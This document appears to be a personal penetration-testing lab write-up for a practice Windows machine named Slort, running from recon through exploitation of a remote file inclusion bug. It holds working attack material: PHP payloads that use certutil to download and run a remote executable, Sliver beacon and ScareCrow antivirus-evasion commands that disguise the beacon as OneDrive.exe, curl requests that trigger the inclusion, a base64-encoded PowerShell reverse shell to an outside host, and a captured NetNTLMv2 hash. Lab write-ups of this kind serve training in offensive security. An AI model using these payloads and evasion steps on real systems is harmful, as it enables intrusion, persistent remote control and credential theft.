# Slort Notes

## Data 

IP: 192.168.171.53
OS: Windows 10 Build 19041
Arch: x64 amd64
Hostname: SLORT
Domain: slort
Domain SID:
Machine Purpose: web server with mysql
Services: ftp, mysql, smb-135+9,  
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Slort-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
rupert
```

#### HUMINT


#### Solution Inventory Map

username


#### Todo 

- Contextualise bf for xammp

Check 
- Filezilla
- windows/dos/1336.cpp
#### Timeline of tasks completed

- Years around recon
- ftp no rupert : rupert
- no mysql remote login
- reestablishing the wtf of where I and this machine is actual at 
- smb 445 found on the rescan
- phpinfo.php - prior not that the 8080 is different...
	- Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
	- apache is running 80 localhost...
	- ftp support enables
	- curl version mismatch?
		- 8.3? and 7.69.1
			- 8.3 CVE-2023-38546 - 
				- https://www.intruder.io/blog/curl-high-rated-cve-2023-38545
				- The curl vulnerability is a heap-based [buffer overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow) within hostnames of SOCKS5 proxies via the command-line flag. This happens due to curl switching to a local resolve mode if the name is too long. However, there are some caveats/requirements to make exploitation possible:
					- The attacker must be able to point curl at a malicious server they control
					- curl must be using a SOCKS5 proxy using proxy-resolver mode
					- curl must be configured to automatically follow redirects
					- An overflow is only possible in applications that do not set [CURLOPT_BUFFERSIZE](https://curl.se/libcurl/c/CURLOPT_BUFFERSIZE.html) when using libcurl, or set it smaller than 65541. Since curl sets [CURLOPT_BUFFERSIZE](https://curl.se/libcurl/c/CURLOPT_BUFFERSIZE.html) to 100kB by default it is not vulnerable in its default state
					- The SOCKS5 handshake to trigger the local variable bug needs to be "slow enough" to trigger the local variable bug. This is not defined, however they do state "typical server latency is likely slow enough"
- gobustering dashboard/
- searchsploit oclock
	- zurb-foundation - 5.0.0 - xxs captions < 6
	- Apache/2.4.43 (Win64) 
	- OpenSSL/1.1.1g 
	- PHP/7.4.6
	- curl 8.3 - VULN possiblely not intended
 - all.js analysis 
 - found more links from looking at [[tech-detect-https___192.168.122.55_dashboard_-zurb-foundation]]
 - filezilla
	 - https://github.com/NeoTheCapt/FilezillaExploit/blob/master/FuckFilezilla_0_9_41.php
	 - https://www.exploit-db.com/exploits/1336

Helped Through

locationindexphp.png

- site/index.php has rfi
- Learnt we need to have two php files to download our shell and execute that shell

pocrfi.png

One to download with
```php
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/shell.exe" shell.exe', $val);
?>
```

To execute with
```php
<?php
$exec = system('shell.exe', $val);
?>
```


```bash
# Generate sliver beacon shellcode disabling shikata ga nai
generate beacon --mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode -G
# use 
/opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# Build with golang
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# Pack with upx
upx $file.exe
```

I converted:
```php
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.45.164/OneDrive.exe" C:\programdata\OneDrive.exe', $val);
?>
```
and
```php
<?php
$exec = system('C:\programdata\OneDrive.exe', $val);
?>
```
To try to run in Windows Memory.

```bash
curl 'http://192.168.171.53:8080/site/index.php?page=http://192.168.45.164/rfi-Download-CertUtil.php'
curl 'http://192.168.171.53:8080/site/index.php?page=http://192.168.45.164/rfi-Exec.php'
```

wehaveexec.png

rupertthexamppwebguy.png

lsingsliveringaround.png

adminandadminstrator.png

Two is one and one is none
```php
<?php
$exec = system('powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA', $val);
?>

```

```
curl 'http://192.168.171.53:8080/site/index.php?page=http://192.168.45.164/rfi-ExecPsRevb64.php'
```
enumtheslort.png

Nice Windows 10 without AV, Firewalls and pswh jails with a clean systeminfo
nicesysteminfo.png


rupertisnotspecial.png

Xampp Stack
web config and files
- `C:\xampp\apache\conf\httpd.conf` - no creds

sql database
nicepasswords.png



ftp config
`C:\xampp\FileZillaFTP`
tftptobackupWabletextfile.png

F no backup.txt, Backup directory and TFTP.exe 
permsonthebackupdirandfiles.png

- it runs every 5 mins so enumerate schtasks
	- But schtasks does not show a schtask


- Lessons learnt
	- RFI code exucte from FI setup
	- do not check access.logs after brute forcing for sites directory...
	- php.ini for xampp

rupertsecpackagecreds.png

```
rupert::SLORT:1122334455667788:ff850562aa499d0ed76fc6974258e33e:0101000000000000f78f70e0a611da01d2f11b95b57c134d00000000080030003000000000000000000000000020000085ed7e6b8d60eecb9d9166ec6860e3d7b50754c91f4ec967447609787e1731930a00100000000000000000000000000000000000090000000000000000000000
```
NetNTLMv2 not in rockyou.txt

ftponthelocalhost.png

xamppwinpeas.png

serviceswecontroll.png

rupertsrdpsession.png

arpandipconfig.png

Had some life issues and lost focus and had mental blank returning to Backup directory after getting `arp` cache and `ipconfig` to consider the network infastructure

administrator.png

schtask require administrator to view all
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks